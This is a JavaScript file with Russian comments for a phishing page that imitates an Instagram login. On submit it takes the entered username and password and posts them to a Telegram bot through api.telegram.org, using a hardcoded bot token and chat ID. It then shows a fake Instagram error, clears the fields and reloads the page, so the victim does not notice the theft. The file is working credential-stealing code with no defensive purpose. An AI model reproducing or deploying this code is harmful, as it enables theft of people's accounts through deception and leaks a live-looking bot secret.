// Находим элемент формы по ID и добавляем слушатель события 'submit'
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Останавливаем стандартное поведение формы (предотвращаем отправку данных на сервер)

    // Получаем значения полей логина и пароля
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Токен Telegram-бота и ID чата, куда будут отправляться данные
    const botToken = '7803206539:AAFZGOfx9OXhiVhzLAB1k_mfyZzPepEiRLw'; // Токен вашего бота
    const chatId = '1820482243'; // Замените на ваш chat_id, куда нужно отправлять сообщение

    // Формируем текст сообщения для отправки в Telegram
    const message = `Логин: ${username}\nПароль: ${password}`;

    // URL API для отправки сообщения через Telegram
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Отправляем данные через fetch (POST-запрос)
    fetch(url, {
        method: 'POST', // Метод запроса
        headers: {
            'Content-Type': 'application/json' // Указываем тип данных, которые отправляем
        },
        body: JSON.stringify({
            chat_id: chatId, // ID чата в Telegram
            text: message // Само сообщение
        })
    })
 .then(responce => responce.json())
 .then(data => {
  if (data.ok) {
   console.log('Сообщение отправлено в Telegram');

   const errorMessage = document.createElement('p');
   errorMessage.style.color = 'red';
   errorMessage.style.marginTop = '10px';
   errorMessage.textContent = 'При попытке входа в Instagram произошла ошибка. Повторите попытку позже.'

   const forgotPasswordLink = document.querySelector(".forgot-password");
   forgotPasswordLink.parentNode.insertBefore(errorMessage, forgotPasswordLink);


   document.getElementById("username").value = " ";
   document.getElementById("password").value = " ";

   setTimeout(function() {
    window.location.reload();
   }, 3000);
  } else {
   console.error("ошибка", data);
  }
 })
 .catch(error => console.error('ошибка:', error));
});
